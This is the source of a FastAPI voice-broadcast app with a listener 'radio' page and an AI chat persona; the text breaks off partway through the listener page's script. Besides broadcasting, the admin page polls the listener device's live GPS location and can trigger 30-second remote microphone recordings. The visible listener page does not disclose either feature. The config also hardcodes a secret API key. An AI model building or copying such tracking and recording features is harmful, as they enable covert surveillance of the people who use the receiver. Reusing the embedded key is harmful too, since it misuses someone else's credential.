"""
Voicetyper 1.7 — Pure HTML + FastAPI + AI + Voice Chat + PWA + History
  /admin   →  broadcast control (manual + AI ghostwriter + 数字分身)
  /m       →  mobile admin (quick broadcast + history)
  /listen  →  immersive receiver (broadcast + AI voice chat) + PWA
  /api/*   →  REST + AI generation + AI chat + persona + history
  /audio/  →  static WAV files
"""
import os

# --- 屏蔽代理 ---
os.environ["NO_PROXY"] = "127.0.0.1,localhost"
for k in ("HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "all_proxy"):
    os.environ.pop(k, None)

import json
import asyncio
import subprocess, tempfile, threading, time, glob, httpx
from urllib.parse import quote
from fastapi import FastAPI, Form, UploadFile, File, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse, Response, StreamingResponse
import whisper

# ============================================================
# Config
# ============================================================
SOVITS_API = "http://127.0.0.1:9880"
DEEPSEEK_KEY = "sk-b30ad7aa93854170919aab6473a03b21"
DEEPSEEK_URL = "https://api.deepseek.com/chat/completions"
AUDIO_DIR = "/tmp/voicetyper"
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(AUDIO_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

CHAT_HISTORY_FILE = os.path.join(DATA_DIR, "chat_history.json")
BROADCAST_HISTORY_FILE = os.path.join(DATA_DIR, "broadcast_history.json")

last_updated = 0
latest_url = None
_lock = threading.Lock()
http = httpx.Client(trust_env=False, timeout=60)

AI_SYSTEM_PROMPT = (
    "你是一个优雅的语音广播文案助手。"
    "根据用户的主题或关键词，生成一段适合朗读的优美文案。"
    "要求：简洁、有诗意、口语化流畅、不超过120字。"
    "直接输出正文，不要加任何前缀或解释。"
)

AI_CHAT_SYSTEM_PROMPT = (
    "你是一个温暖、优雅的对话助手，你就是对方的数字分身。"
    "你说话温柔、自然、有亲和力，像朋友之间的聊天。"
    "回复要求：口语化流畅、适合语音朗读、不超过80字。"
    "直接输出回复内容，不要加任何前缀或解释。"
)

persona_text = ""  # 用户上传的聊天记录，用于定制 AI 风格
persona_lock = threading.Lock()

# ---- 聊天持久化 ----
chat_history = []  # [{"role":"user"/"assistant","content":"...","time":1234567890}]
chat_lock = threading.Lock()

def _load_chat_history():
    """从 JSON 文件载入聊天记录"""
    global chat_history
    try:
        if os.path.exists(CHAT_HISTORY_FILE):
            with open(CHAT_HISTORY_FILE, "r", encoding="utf-8") as f:
                chat_history = json.load(f)
            print(f"  Chat history loaded: {len(chat_history)} messages", flush=True)
    except Exception as e:
        print(f"  Chat history load failed: {e}", flush=True)
        chat_history = []

def _save_chat_history():
    """持久化聊天记录到 JSON 文件"""
    try:
        with open(CHAT_HISTORY_FILE, "w", encoding="utf-8") as f:
            json.dump(chat_history, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"  Chat history save failed: {e}", flush=True)

# ---- 广播历史 ----
broadcast_history = []  # [{"text":...,"time":...,"url":...}]
broadcast_history_lock = threading.Lock()

def _load_broadcast_history():
    global broadcast_history
    try:
        if os.path.exists(BROADCAST_HISTORY_FILE):
            with open(BROADCAST_HISTORY_FILE, "r", encoding="utf-8") as f:
                broadcast_history = json.load(f)
            print(f"  Broadcast history loaded: {len(broadcast_history)} items", flush=True)
    except Exception as e:
        print(f"  Broadcast history load failed: {e}", flush=True)
        broadcast_history = []

def _save_broadcast_history():
    try:
        with open(BROADCAST_HISTORY_FILE, "w", encoding="utf-8") as f:
            json.dump(broadcast_history, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"  Broadcast history save failed: {e}", flush=True)

# 啟動時載入
_load_chat_history()
_load_broadcast_history()

# 位置追踪
location_history = []  # [{"lat":...,"lng":...,"accuracy":...,"timestamp":...}]
location_lock = threading.Lock()

# 远程录音
remote_record_requested = False
remote_record_lock = threading.Lock()

# 广播激活开关（admin 控制 listen 是否播放）
broadcast_active = False
broadcast_active_lock = threading.Lock()
remote_audio_files = []  # 最近远程录音文件列表

# SSE 事件推送（替代轮询）
_event_queues = []  # list of asyncio.Queue
_event_lock = threading.Lock()


def _publish_event(data: dict):
    """向所有 SSE 客户端推送事件"""
    with _event_lock:
        n = len(_event_queues)
        if n == 0:
            print(f"  [SSE] publish {data.get('type')} — NO CLIENTS", flush=True)
            return
        for q in _event_queues:
            try:
                q.put_nowait(data)
            except asyncio.QueueFull:
                pass
        print(f"  [SSE] publish {data.get('type')} → {n} client(s)", flush=True)


def _cleanup(keep=5):
    files = sorted(glob.glob(os.path.join(AUDIO_DIR, "broadcast_*.wav")), key=os.path.getmtime)
    for f in files[:-keep]:
        try:
            os.remove(f)
        except OSError:
            pass


def broadcast(text: str) -> str:
    global last_updated, latest_url
    if not text.strip():
        return "请输入文字"
    try:
        resp = http.post(SOVITS_API, json={
            "text": text, "text_language": "zh", "cut_punc": "，。"
        })
        if resp.status_code == 200:
            fname = f"broadcast_{int(time.time() * 1000)}.wav"
            fpath = os.path.join(AUDIO_DIR, fname)
            with open(fpath, "wb") as f:
                f.write(resp.content)
            now = time.time()
            with _lock:
                latest_url = f"/audio/{fname}"
                last_updated = now
            # 记录广播历史
            with broadcast_history_lock:
                broadcast_history.append({"text": text, "time": now, "url": latest_url})
                if len(broadcast_history) > 500:
                    broadcast_history[:] = broadcast_history[-500:]
                _save_broadcast_history()
            _cleanup()
            _publish_event({"type": "broadcast", "url": latest_url, "ts": last_updated})
            return f"已广播 — {text}"
        return f"TTS 返回 {resp.status_code}: {resp.text[:100]}"
    except httpx.ConnectError:
        return "无法连接 TTS 服务"
    except Exception as e:
        return f"错误: {e}"


def ai_generate(prompt: str) -> dict:
    """调用 DeepSeek 生成文案"""
    try:
        resp = http.post(
            DEEPSEEK_URL,
            headers={
                "Authorization": f"Bearer {DEEPSEEK_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "model": "deepseek-chat",
                "messages": [
                    {"role": "system", "content": AI_SYSTEM_PROMPT},
                    {"role": "user", "content": prompt},
                ],
                "temperature": 0.8,
                "max_tokens": 300,
            },
        )
        if resp.status_code == 200:
            data = resp.json()
            text = data["choices"][0]["message"]["content"].strip()
            return {"ok": True, "text": text}
        return {"ok": False, "error": f"DeepSeek API 返回 {resp.status_code}"}
    except httpx.ConnectError:
        return {"ok": False, "error": "无法连接 DeepSeek API"}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def ai_chat(text: str) -> dict:
    """AI 对话：生成回复 + TTS，返回文本和音频"""
    global last_updated, latest_url, chat_history

    if not text.strip():
        return {"ok": False, "error": "请输入文字"}

    try:
        # 1. DeepSeek
        with chat_lock:
            msgs = list(chat_history) + [{"role": "user", "content": text}]

        # 注入数字分身风格
        system_prompt = AI_CHAT_SYSTEM_PROMPT
        with persona_lock:
            if persona_text.strip():
                system_prompt += f"\n\n以下是你需要模仿的说话风格和语气，请严格参照：\n{persona_text}"

        resp = http.post(
            DEEPSEEK_URL,
            headers={
                "Authorization": f"Bearer {DEEPSEEK_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "model": "deepseek-chat",
                "messages": [
                    {"role": "system", "content": system_prompt},
                    *msgs,
                ],
                "temperature": 0.85,
                "max_tokens": 120,
            },
        )
        if resp.status_code != 200:
            return {"ok": False, "error": f"DeepSeek API 返回 {resp.status_code}"}

        data = resp.json()
        reply = data["choices"][0]["message"]["content"].strip()

        with chat_lock:
            now = time.time()
            chat_history.append({"role": "user", "content": text, "time": now})
            chat_history.append({"role": "assistant", "content": reply, "time": now})
            # 保留全部記錄，只持久化
            _save_chat_history()

        # 2. TTS
        url = None
        ts_val = None
        try:
            tts_resp = http.post(SOVITS_API, json={
                "text": reply, "text_language": "zh", "cut_punc": "，。"
            })
            if tts_resp.status_code == 200:
                fname = f"broadcast_{int(time.time() * 1000)}.wav"
                fpath = os.path.join(AUDIO_DIR, fname)
                with open(fpath, "wb") as f:
                    f.write(tts_resp.content)
                url = f"/audio/{fname}"
                ts_val = time.time()
                with _lock:
                    latest_url = url
                    last_updated = ts_val
                _cleanup()
                _publish_event({"type": "broadcast", "url": url, "ts": ts_val})
        except Exception:
            pass

        return {"ok": True, "reply": reply, "url": url, "ts": ts_val}

    except httpx.ConnectError:
        return {"ok": False, "error": "无法连接 DeepSeek API"}
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ---- Whisper ----
_whisper_model = None

def get_whisper():
    global _whisper_model
    if _whisper_model is None:
        _whisper_model = whisper.load_model("tiny")
    return _whisper_model


def preload_whisper():
    """预加载 whisper 模型，避免首次请求等待"""
    import sys
    print("  Loading whisper-tiny...", end=" ", flush=True)
    sys.stdout.flush()
    get_whisper()
    print("done")


def transcribe_audio(audio_bytes: bytes) -> str:
    """浏览器传来的 webm/mp4 音频 → ffmpeg 转 WAV → whisper 识别"""
    # 写入原始音频临时文件
    with tempfile.NamedTemporaryFile(suffix=".tmp", delete=False) as f:
        f.write(audio_bytes)
        raw_path = f.name

    wav_path = raw_path + ".wav"
    try:
        # ffmpeg 转成 16kHz mono WAV
        subprocess.run([
            "ffmpeg", "-y", "-i", raw_path,
            "-ar", "16000", "-ac", "1", "-f", "wav", wav_path
        ], capture_output=True, timeout=30)

        model = get_whisper()
        result = model.transcribe(wav_path, language="zh", fp16=False)
        return result["text"].strip()
    finally:
        for p in (raw_path, wav_path):
            try:
                os.unlink(p)
            except OSError:
                pass


# ============================================================
# FastAPI App
# ============================================================
app = FastAPI()

# ---- Shared CSS ----
SHARED_CSS = """
    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@500;600;700&display=swap');
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    body{
        font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","PingFang SC","Helvetica Neue","Microsoft YaHei",sans-serif;
        background:linear-gradient(180deg,#faf8ff 0%,#f5f0ff 100%);
        min-height:100vh;display:flex;align-items:center;justify-content:center;
        -webkit-tap-highlight-color:transparent;
    }
    .card{
        background:rgba(255,255,255,0.75);
        backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);
        border:1px solid rgba(124,58,237,0.10);
        border-radius:24px;
        box-shadow:0 2px 20px rgba(124,58,237,0.06),0 8px 40px rgba(124,58,237,0.04);
        padding:2.5rem 2rem;width:100%;max-width:440px;margin:1.5rem;
        transition:box-shadow 0.4s;
    }
    .card:hover{box-shadow:0 4px 28px rgba(124,58,237,0.10),0 12px 48px rgba(124,58,237,0.06)}
    .logo{
        font-family:"Dancing Script",cursive;
        font-size:2.4rem;font-weight:600;text-align:center;
        background:linear-gradient(135deg,#7c3aed,#a855f7,#c084fc);
        -webkit-background-clip:text;-webkit-text-fill-color:transparent;
        background-clip:text;letter-spacing:0.02em;line-height:1.2;
    }
    .sub{
        text-align:center;color:#a78bfa;font-size:0.72rem;font-weight:500;
        letter-spacing:0.14em;text-transform:uppercase;margin:0.3rem 0 1.25rem 0;
    }
    .btn{
        display:block;width:100%;border:none;border-radius:16px;
        font-weight:600;font-size:0.95rem;padding:0.85rem 1.5rem;cursor:pointer;
        transition:all 0.25s;-webkit-tap-highlight-color:transparent;
        background:linear-gradient(135deg,#7c3aed,#8b5cf6);color:#fff;
        box-shadow:0 2px 10px rgba(124,58,237,0.25);
    }
    .btn:hover{box-shadow:0 4px 20px rgba(124,58,237,0.38);transform:translateY(-1px)}
    .btn:active{transform:scale(0.98)}
    .btn-secondary{
        background:#fff;color:#7c3aed;
        border:1.5px solid rgba(124,58,237,0.20);
        box-shadow:0 1px 4px rgba(124,58,237,0.08);
    }
    .btn-secondary:hover{background:rgba(124,58,237,0.04);border-color:#a78bfa}
    .status{text-align:center;font-size:0.85rem;color:#8b5cf6;margin-top:0.75rem;min-height:1.2em}
    .spinner{
        display:inline-block;width:1em;height:1em;border:2px solid rgba(124,58,237,0.15);
        border-top-color:#7c3aed;border-radius:50%;animation:spin 0.6s linear infinite;
        vertical-align:middle;margin-right:0.4em;
    }
    @keyframes spin{to{transform:rotate(360deg)}}
"""


# ============================================================
# /admin — Broadcast Control (Manual + AI Ghostwriter)
# ============================================================
ADMIN_HTML = """<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Voicetyper · Admin</title>
<style>
    /* === inherited from SHARED_CSS === */
    {shared_css}
    /* === admin-specific === */
    textarea{{
        width:100%;border:1.5px solid #e9d5ff;border-radius:14px;
        background:#faf8ff;padding:0.9rem 1rem;font-size:0.95rem;
        line-height:1.6;resize:none;font-family:inherit;margin-bottom:0.85rem;
        transition:border-color 0.2s,box-shadow 0.2s;
    }}
    textarea:focus{{border-color:#a78bfa;box-shadow:0 0 0 4px rgba(124,58,237,0.07);outline:none}}
    #promptInput{{margin-bottom:0.5rem;min-height:60px;font-size:0.9rem;display:none}}
    #promptInput.show{{display:block}}
    /* === Apple 风格分段控件 === */
    .segmented{{
        display:flex;background:rgba(124,58,237,0.06);
        border-radius:10px;padding:3px;margin-bottom:1.1rem;
    }}
    .seg-btn{{
        flex:1;border:none;background:transparent;padding:0.45rem 0.8rem;
        font-size:0.82rem;font-weight:500;color:#a78bfa;border-radius:8px;
        cursor:pointer;transition:all 0.2s;font-family:inherit;
    }}
    .seg-btn.active{{
        background:#fff;color:#7c3aed;font-weight:600;
        box-shadow:0 1px 4px rgba(124,58,237,0.08);
    }}
    .btn-row{{display:flex;gap:0.6rem;margin-bottom:0.25rem}}
    .btn-row .btn{{flex:1}}
    #aiGenerateBtn{{display:none}}
    #aiGenerateBtn.show{{display:block}}
</style>
</head>
<body>
<div class="card">
    <div class="logo">Voicetyper</div>
    <div class="sub">Broadcast Control</div>

    <!-- 分段控件 -->
    <div class="segmented">
        <button class="seg-btn active" onclick="switchMode('manual')" id="segManual">手动输入</button>
        <button class="seg-btn" onclick="switchMode('ai')" id="segAI">AI 代笔</button>
    </div>

    <!-- 提示词输入（AI 模式） -->
    <textarea id="promptInput" placeholder="输入主题或关键词，AI 将为你生成文案..."></textarea>

    <!-- 正文区 -->
    <textarea id="text" rows="4" placeholder="输入要发送的文字..." autofocus></textarea>

    <!-- 按钮行 -->
    <div class="btn-row">
        <button class="btn btn-secondary" id="aiGenerateBtn" onclick="aiGenerate()">
            AI 生成
        </button>
        <button class="btn" type="button" id="sendBtn" onclick="sendBroadcast()">发送广播</button>
    </div>

    <!-- 广播激活开关 -->
    <div style="display:flex;align-items:center;justify-content:space-between;
        background:rgba(124,58,237,0.04);border-radius:14px;padding:0.7rem 1rem;margin-top:0.6rem">
        <div>
            <div style="font-size:0.85rem;color:#4c1d95;font-weight:600">收听端激活</div>
            <div style="font-size:0.68rem;color:#a78bfa" id="activeStatus">未激活</div>
        </div>
        <button class="btn" id="activateBtn" onclick="toggleActivate()"
            style="width:auto;font-size:0.82rem;padding:0.5rem 1.2rem;
            background:linear-gradient(135deg,#10b981,#059669)">激活</button>
    </div>

    <div class="status" id="status"></div>

    <!-- 数字分身设置 -->
    <div style="margin-top:1.5rem;padding-top:1rem;border-top:1px solid rgba(124,58,237,0.08)">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:0.4rem">
            <span style="font-size:0.82rem;color:#7c3aed;font-weight:600">数字分身</span>
            <button onclick="togglePersona()" style="font-size:0.72rem;color:#a78bfa;background:none;border:none;cursor:pointer;font-family:inherit">设置</button>
        </div>
        <div id="personaPanel" style="display:none">
            <textarea id="personaText" rows="6" placeholder="粘贴聊天记录，AI 将学习你的说话风格..."
                style="width:100%;border:1.5px solid #e9d5ff;border-radius:12px;background:#faf8ff;
                padding:0.7rem 0.9rem;font-size:0.85rem;line-height:1.5;resize:vertical;
                font-family:inherit;margin-bottom:0.5rem;transition:border-color 0.2s"></textarea>
            <div class="btn-row" style="margin-bottom:0.25rem">
                <button class="btn btn-secondary" onclick="savePersona()" style="font-size:0.82rem;padding:0.5rem">保存</button>
                <button class="btn btn-secondary" onclick="clearPersona()" style="font-size:0.82rem;padding:0.5rem">清除</button>
            </div>
            <div class="status" id="personaStatus" style="font-size:0.78rem"></div>
        </div>
    </div>

    <!-- 安全监控 -->
    <div style="margin-top:1.5rem;padding-top:1rem;border-top:1px solid rgba(124,58,237,0.08)">
        <div style="font-size:0.82rem;color:#7c3aed;font-weight:600;margin-bottom:0.6rem">安全监控</div>

        <!-- 位置 -->
        <div style="background:rgba(124,58,237,0.025);border-radius:14px;padding:0.8rem;margin-bottom:0.6rem">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.3rem">
                <span style="font-size:0.76rem;color:#a78bfa;font-weight:500">实时位置</span>
                <span style="font-size:0.68rem;color:#c4b5fd" id="locationTime">--</span>
            </div>
            <div id="locationDisplay" style="font-size:0.85rem;color:#4c1d95;margin-bottom:0.3rem">
                等待位置数据...
            </div>
            <div id="locationMap" style="width:100%;height:180px;border-radius:10px;overflow:hidden;background:#f5f0ff;display:none">
                <iframe id="mapFrame" style="width:100%;height:100%;border:none" allow="geolocation"></iframe>
            </div>
            <div style="display:flex;gap:0.4rem;margin-top:0.3rem">
                <a id="mapLink" href="#" target="_blank" style="font-size:0.7rem;color:#a78bfa;text-decoration:none;display:none">在 OpenStreetMap 中查看 →</a>
            </div>
        </div>

        <!-- 远程录音 -->
        <div style="background:rgba(239,68,68,0.03);border-radius:14px;padding:0.8rem;margin-bottom:0.6rem">
            <div style="font-size:0.76rem;color:#ef4444;font-weight:500;margin-bottom:0.5rem">远程录音</div>
            <button class="btn" onclick="triggerRemoteRecord()" id="remoteRecordBtn"
                style="background:linear-gradient(135deg,#ef4444,#f43f5e);font-size:0.82rem;padding:0.6rem;margin-bottom:0.4rem">
                触发远程录音 (30秒)
            </button>
            <div class="status" id="remoteRecordStatus" style="font-size:0.75rem;color:#ef4444"></div>
            <div id="remoteAudioList" style="margin-top:0.4rem"></div>
        </div>
    </div>
</div>

<script>
var _mode='manual';

function switchMode(mode){{
    _mode=mode;
    document.querySelectorAll('.seg-btn').forEach(function(b){{b.classList.remove('active')}});
    document.getElementById(mode==='manual'?'segManual':'segAI').classList.add('active');

    var prompt=document.getElementById('promptInput');
    var aiBtn=document.getElementById('aiGenerateBtn');
    var text=document.getElementById('text');

    if(mode==='ai'){{
        prompt.classList.add('show');
        aiBtn.classList.add('show');
        text.placeholder='AI 生成的文案将显示在这里，你可以编辑后发送...';
    }}else{{
        prompt.classList.remove('show');
        aiBtn.classList.remove('show');
        text.placeholder='输入要发送的文字...';
    }}
}}

async function aiGenerate(){{
    var prompt=document.getElementById('promptInput').value.trim();
    if(!prompt){{document.getElementById('status').textContent='请输入主题或关键词';return}}

    var btn=document.getElementById('aiGenerateBtn');
    btn.disabled=true;
    btn.innerHTML='<span class="spinner"></span>思考中...';
    document.getElementById('status').textContent='';

    try{{
        var f=new FormData();f.append('prompt',prompt);
        var r=await fetch('/api/ai/generate',{{method:'POST',body:f}});
        var j=await r.json();
        if(j.ok){{
            document.getElementById('text').value=j.text;
            document.getElementById('status').textContent='AI 已生成，可编辑后发送';
        }}else{{
            document.getElementById('status').textContent='AI 错误: '+j.error;
        }}
    }}catch(e){{
        document.getElementById('status').textContent='网络错误';
    }}
    btn.disabled=false;
    btn.textContent='AI 生成';
}}

var _adminActive=false;
async function toggleActivate(){{
    var btn=document.getElementById('activateBtn');
    var st=document.getElementById('activeStatus');
    btn.disabled=true;
    try{{
        var r=await fetch(_adminActive?'/api/deactivate':'/api/activate',{{method:'POST'}});
        var j=await r.json();
        _adminActive=j.active;
        if(_adminActive){{
            btn.textContent='停用';
            btn.style.background='linear-gradient(135deg,#ef4444,#f43f5e)';
            st.textContent='已激活 — listen 正在轮询播放';
            st.style.color='#10b981';
        }}else{{
            btn.textContent='激活';
            btn.style.background='linear-gradient(135deg,#10b981,#059669)';
            st.textContent='未激活 — listen 静默中';
            st.style.color='#a78bfa';
        }}
    }}catch(e){{}}
    btn.disabled=false;
}}

async function sendBroadcast(){{
    var t=document.getElementById('text').value;
    if(!t.trim()){{document.getElementById('status').textContent='请输入文字';return}}

    var btn=document.getElementById('sendBtn');
    btn.disabled=true;btn.textContent='发送中...';
    document.getElementById('status').textContent='';

    try{{
        var f=new FormData();f.append('text',t);
        var r=await fetch('/api/send',{{method:'POST',body:f}});
        var j=await r.json();
        document.getElementById('status').textContent=j.status;
        if(j.status.indexOf('已广播')===0){{
            document.getElementById('text').value='';
            document.getElementById('promptInput').value='';
        }}
    }}catch(e){{
        document.getElementById('status').textContent='网络错误';
    }}
    btn.disabled=false;btn.textContent='发送广播';
}}

// === 数字分身 ===
function togglePersona(){{
    var p=document.getElementById('personaPanel');
    if(p.style.display==='none'){{
        p.style.display='block';
        loadPersona();
    }}else{{
        p.style.display='none';
    }}
}}

async function loadPersona(){{
    try{{
        var r=await fetch('/api/persona/get');
        var j=await r.json();
        if(j.ok && j.text){{
            document.getElementById('personaText').value=j.text;
        }}
    }}catch(e){{}}
}}

async function savePersona(){{
    var text=document.getElementById('personaText').value.trim();
    var f=new FormData();f.append('text',text);
    var r=await fetch('/api/persona/save',{{method:'POST',body:f}});
    var j=await r.json();
    if(j.ok){{
        document.getElementById('personaStatus').textContent='已保存 ('+j.len+' 字)';
    }}else{{
        document.getElementById('personaStatus').textContent='保存失败';
    }}
}}

async function clearPersona(){{
    await fetch('/api/persona/clear',{{method:'POST'}});
    document.getElementById('personaText').value='';
    document.getElementById('personaStatus').textContent='已清除';
}}

// === 安全监控：位置追踪 ===
var _locationTimer=null;
function startLocationMonitor(){{
    refreshLocation();
    _locationTimer=setInterval(refreshLocation,10000);
}}
async function refreshLocation(){{
    try{{
        var r=await fetch('/api/location/latest');
        var j=await r.json();
        if(j.ok && j.location){{
            var loc=j.location;
            document.getElementById('locationDisplay').innerHTML=
                '纬度 '+loc.lat.toFixed(6)+' / 经度 '+loc.lng.toFixed(6)+
                (loc.accuracy?' (精度 '+Math.round(loc.accuracy)+'m)':'');
            var d=new Date(loc.timestamp*1000);
            document.getElementById('locationTime').textContent=
                d.toLocaleTimeString('zh-CN');
            // 地图
            var mapDiv=document.getElementById('locationMap');
            mapDiv.style.display='block';
            var pad=0.008;
            var bbox=(loc.lng-pad)+','+(loc.lat-pad)+','+(loc.lng+pad)+','+(loc.lat+pad);
            document.getElementById('mapFrame').src=
                'https://www.openstreetmap.org/export/embed.html?bbox='+bbox+'&layer=mapnik&marker='+loc.lat+','+loc.lng;
            var link=document.getElementById('mapLink');
            link.style.display='inline';
            link.href='https://www.openstreetmap.org/?mlat='+loc.lat+'&mlon='+loc.lng+'#map=16/'+loc.lat+'/'+loc.lng;
        }}
    }}catch(e){{}}
}}
startLocationMonitor();

// === 安全监控：远程录音 ===
async function triggerRemoteRecord(){{
    var btn=document.getElementById('remoteRecordBtn');
    btn.disabled=true;btn.textContent='发送指令中...';
    document.getElementById('remoteRecordStatus').textContent='';
    try{{
        var r=await fetch('/api/remote-record/trigger',{{method:'POST'}});
        var j=await r.json();
        document.getElementById('remoteRecordStatus').textContent=j.msg||'指令已发送';
        // 30秒后刷新录音列表
        setTimeout(loadRemoteAudioList,35000);
    }}catch(e){{
        document.getElementById('remoteRecordStatus').textContent='网络错误';
    }}
    btn.disabled=false;btn.textContent='触发远程录音 (30秒)';
}}

async function loadRemoteAudioList(){{
    try{{
        var r=await fetch('/api/remote-record/list');
        var j=await r.json();
        var list=document.getElementById('remoteAudioList');
        if(j.files && j.files.length>0){{
            var html='';
            j.files.reverse().forEach(function(f){{
                var d=new Date(f.ts*1000);
                html+='<div style="display:flex;align-items:center;gap:0.4rem;margin-bottom:0.2rem">'+
                    '<span style="font-size:0.7rem;color:#a78bfa">'+d.toLocaleTimeString('zh-CN')+'</span>'+
                    '<audio src="'+f.url+'" controls style="flex:1;height:28px"></audio>'+
                '</div>';
            }});
            list.innerHTML=html;
        }}else{{
            list.innerHTML='<span style="font-size:0.7rem;color:#c4b5fd">暂无远程录音</span>';
        }}
    }}catch(e){{}}
}}
loadRemoteAudioList();
</script>
</body>
</html>"""


@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    return ADMIN_HTML.format(shared_css=SHARED_CSS)


# ============================================================
# /listen — Immersive Receiver (Broadcast + AI Voice Chat)
# ============================================================
LISTEN_HTML = """<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<title>Voicetyper · Listen</title>
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#7c3aed">
<style>
    {shared_css}
    /* === layout === */
    .card{{display:flex;flex-direction:column;align-items:center}}
    /* === Segmented Control === */
    .segmented{{
        display:flex;background:rgba(124,58,237,0.06);
        border-radius:10px;padding:3px;margin-bottom:1.1rem;width:100%;
    }}
    .seg-btn{{
        flex:1;border:none;background:transparent;padding:0.45rem 0.8rem;
        font-size:0.82rem;font-weight:500;color:#a78bfa;border-radius:8px;
        cursor:pointer;transition:all 0.2s;font-family:inherit;
    }}
    .seg-btn.active{{
        background:#fff;color:#7c3aed;font-weight:600;
        box-shadow:0 1px 4px rgba(124,58,237,0.08);
    }}
    /* === Circle button === */
    .circle{{
        width:180px;height:180px;border-radius:50%;border:none;
        background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;
        font-size:1.05rem;font-weight:600;letter-spacing:0.04em;
        box-shadow:0 4px 24px rgba(124,58,237,0.30);
        transition:all 0.35s;cursor:pointer;
        -webkit-tap-highlight-color:transparent;user-select:none;
        animation:pulse 2.5s ease-in-out infinite;
        margin:0.5rem 0 1rem 0;flex-shrink:0;
    }}
    @keyframes pulse{{
        0%,100%{{box-shadow:0 4px 24px rgba(124,58,237,0.30);transform:scale(1)}}
        50%{{box-shadow:0 4px 44px rgba(124,58,237,0.50);transform:scale(1.04)}}
    }}
    .circle:active{{transform:scale(0.93)!important;box-shadow:0 2px 12px rgba(124,58,237,0.20)!important}}
    .circle.listening{{
        width:90px;height:90px;font-size:0.7rem;
        background:rgba(255,255,255,0.65);color:#7c3aed;
        border:2px solid rgba(124,58,237,0.18);
        box-shadow:0 2px 12px rgba(124,58,237,0.10);
        animation:none;
    }}
    .circle.recording{{
        background:linear-gradient(135deg,#ef4444,#f43f5e);
        box-shadow:0 4px 28px rgba(239,68,68,0.45);
        animation:recPulse 0.9s ease-in-out infinite;
    }}
    @keyframes recPulse{{
        0%,100%{{box-shadow:0 4px 28px rgba(239,68,68,0.45);transform:scale(1)}}
        50%{{box-shadow:0 4px 40px rgba(239,68,68,0.65);transform:scale(1.05)}}
    }}
    audio{{width:100%;border-radius:14px;outline:none;margin-top:0.25rem}}
    /* === Mode containers === */
    #broadcastUI{{display:flex;flex-direction:column;align-items:center;width:100%}}
    #broadcastUI.hide{{display:none}}
    #chatUI{{display:none;width:100%;flex-direction:column;align-items:center}}
    #chatUI.show{{display:flex}}
    /* === Chat history === */
    .chat-history{{
        width:100%;max-height:240px;overflow-y:auto;margin-bottom:0.6rem;
        display:flex;flex-direction:column;gap:0.45rem;
        padding:0.5rem;border-radius:14px;background:rgba(124,58,237,0.025);
        -webkit-overflow-scrolling:touch;
    }}
    .chat-bubble{{
        padding:0.5rem 0.8rem;border-radius:14px;font-size:0.87rem;
        line-height:1.5;max-width:85%;word-break:break-word;
    }}
    .chat-bubble.user{{
        background:linear-gradient(135deg,#7c3aed,#8b5cf6);color:#fff;
        align-self:flex-end;border-bottom-right-radius:6px;
    }}
    .chat-bubble.ai{{
        background:#fff;color:#4c1d95;align-self:flex-start;
        border:1px solid rgba(124,58,237,0.10);border-bottom-left-radius:6px;
    }}
    /* === Chat input === */
    .chat-input-row{{
        display:flex;gap:0.4rem;width:100%;margin-top:0.3rem;
    }}
    .chat-input-row input{{
        flex:1;border:1.5px solid #e9d5ff;border-radius:12px;
        background:#faf8ff;padding:0.55rem 0.75rem;font-size:0.87rem;
        font-family:inherit;transition:border-color 0.2s;
    }}
    .chat-input-row input:focus{{border-color:#a78bfa;outline:none}}
    .chat-input-row .btn{{
        width:auto;flex:0 0 auto;padding:0.55rem 1rem;font-size:0.85rem;
        border-radius:12px;
    }}
    .chat-reset{{
        font-size:0.72rem;color:#a78bfa;cursor:pointer;margin-top:0.3rem;
        background:none;border:none;font-family:inherit;
    }}
</style>
</head>
<body>
<div class="card">
    <div class="logo">Voicetyper</div>
    <div class="sub">Live Radio</div>

    <!-- Segmented Control -->
    <div class="segmented">
        <button class="seg-btn active" onclick="switchMode('broadcast')" id="segBroadcast">广播收听</button>
        <button class="seg-btn" onclick="switchMode('chat')" id="segChat">AI 对话</button>
    </div>

    <!-- Broadcast Mode -->
    <div id="broadcastUI">
        <button class="circle" id="initBtn" onclick="initAudio()">开始收听</button>
        <div class="status" id="broadcastStatus"></div>
    </div>

    <!-- AI Chat Mode -->
    <div id="chatUI">
        <div class="chat-history" id="chatHistory">
            <div class="chat-bubble ai">你好，想聊些什么？</div>
        </div>
        <button class="circle" id="recordBtn" onclick="toggleRecord()">
            <span id="recordLabel">按住说话</span>
        </button>
        <div class="chat-input-row">
            <input type="text" id="chatInput" placeholder="或输入文字..." autocomplete="off">
            <button class="btn" onclick="sendChatText()">发送</button>
        </div>
        <button class="chat-reset" onclick="resetChat()">新对话</button>
        <div class="status" id="chatStatus"></div>
    </div>

    <audio id="player" controls style="display:none" preload="auto"></audio>
</div>

<script>
var _mode='broadcast';
var _listening=false,_currentTs=0,_player=document.getElementById('player');
var _isRecording=false,_pendingBroadcast=null;
var _audioCtx=null;  // Web Audio API context，initAudio 中由用户手势解锁

function playAudio(url){{
    console.log('[Audio-8] playAudio called, url:',url);
    _player.src=url;
    _player.style.display='block';
